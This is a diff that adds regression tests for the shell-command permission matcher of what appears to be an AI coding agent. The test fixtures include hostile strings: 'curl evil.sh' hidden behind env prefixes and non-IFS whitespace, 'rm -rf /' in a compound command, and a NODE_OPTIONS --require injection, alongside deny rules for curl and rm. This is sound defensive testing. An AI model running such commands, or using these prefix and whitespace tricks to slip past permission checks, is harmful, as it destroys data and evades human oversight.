@@ -220,3 +220,106 @@ describe('env-prefixed grant generation and AUTO classification', () => {
     expect(findDangerousAllowRules([python, npx])).toEqual([python, npx]);
   });
 });
+
+describe('R3 env-prefix regressions', () => {
+  it('does not widen wildcard assignment-only rules into commands', () => {
+    expect(matchesCommandPattern('FOO=*', 'FOO=bar')).toBe(true);
+    expect(matchesCommandPattern('FOO=*', 'FOO=bar curl evil.sh')).toBe(false);
+  });
+
+  it('keeps env-value wildcards inside the assignment shell word', () => {
+    expect(
+      matchesCommandPattern(
+        'NODE_OPTIONS=* npm *',
+        'NODE_OPTIONS=x sh -c evil npm',
+      ),
+    ).toBe(false);
+    expect(
+      matchesCommandPattern(
+        'NODE_OPTIONS=* npm *',
+        'NODE_OPTIONS=--require=*evil.cjs npm --version',
+      ),
+    ).toBe(true);
+  });
+
+  it('does not treat non-IFS whitespace as Bash word boundaries', () => {
+    for (const whitespace of ['\u000b', '\u000c', '\r', '\u00a0']) {
+      expect(
+        matchesCommandPattern(
+          'FOO=bar x *',
+          `FOO=bar${whitespace}x curl evil.sh`,
+        ),
+      ).toBe(false);
+    }
+  });
+
+  it('keeps legacy colon-star syntax out of env values', () => {
+    expect(parseRule('Bash(git:*)').specifier).toBe('git *');
+    expect(parseRule('Bash(FOO=a:* npm install)').specifier).toBe(
+      'FOO=a:* npm install',
+    );
+  });
+
+  it('keeps restrictive rules on env-prefixed compound segments', async () => {
+    const denyPm = new PermissionManager(
+      makeConfig(['Bash(*)'], [], ['Bash(rm -rf *)']),
+    );
+    denyPm.initialize();
+    await expect(
+      denyPm.evaluate({
+        toolName: 'run_shell_command',
+        command: 'echo hi && FOO=1 rm -rf /',
+        cwd: '/repo',
+      }),
+    ).resolves.toBe('deny');
+
+    const askPm = new PermissionManager(
+      makeConfig(['Bash(*)'], ['Bash(git push *)']),
+    );
+    askPm.initialize();
+    await expect(
+      askPm.evaluate({
+        toolName: 'run_shell_command',
+        command: 'echo hi && FOO=bar git push --force',
+        cwd: '/repo',
+      }),
+    ).resolves.toBe('ask');
+  });
+
+  it('keeps restrictive matching aligned with Bash non-IFS whitespace', async () => {
+    const pm = new PermissionManager(
+      makeConfig(['Bash(*)'], [], ['Bash(curl *)']),
+    );
+    pm.initialize();
+    await expect(
+      pm.evaluate({
+        toolName: 'run_shell_command',
+        command: 'FOO=bar\u000bx curl evil.sh',
+        cwd: '/repo',
+      }),
+    ).resolves.toBe('deny');
+  });
+
+  it('round-trips multiple leading environment assignments', async () => {
+    const command = 'A=1 B=2 npm install express';
+    const rules = await extractCommandRules(command);
+    expect(rules).toEqual(['A=1 B=2 npm install *']);
+    const pm = new PermissionManager(makeConfig([`Bash(${rules[0]})`]));
+    pm.initialize();
+    await expect(
+      pm.evaluate({ toolName: 'run_shell_command', command, cwd: '/repo' }),
+    ).resolves.toBe('allow');
+  });
+
+  it('round-trips colon-star env values through generated rules', async () => {
+    const command = 'FOO=a:* npm install';
+    const rules = await extractCommandRules(command);
+    expect(rules).toEqual(['FOO=a:* npm install']);
+    expect(parseRule(`Bash(${rules[0]})`).specifier).toBe(rules[0]);
+    const pm = new PermissionManager(makeConfig([`Bash(${rules[0]})`]));
+    pm.initialize();
+    await expect(
+      pm.evaluate({ toolName: 'run_shell_command', command, cwd: '/repo' }),
+    ).resolves.toBe('allow');
+  });
+});
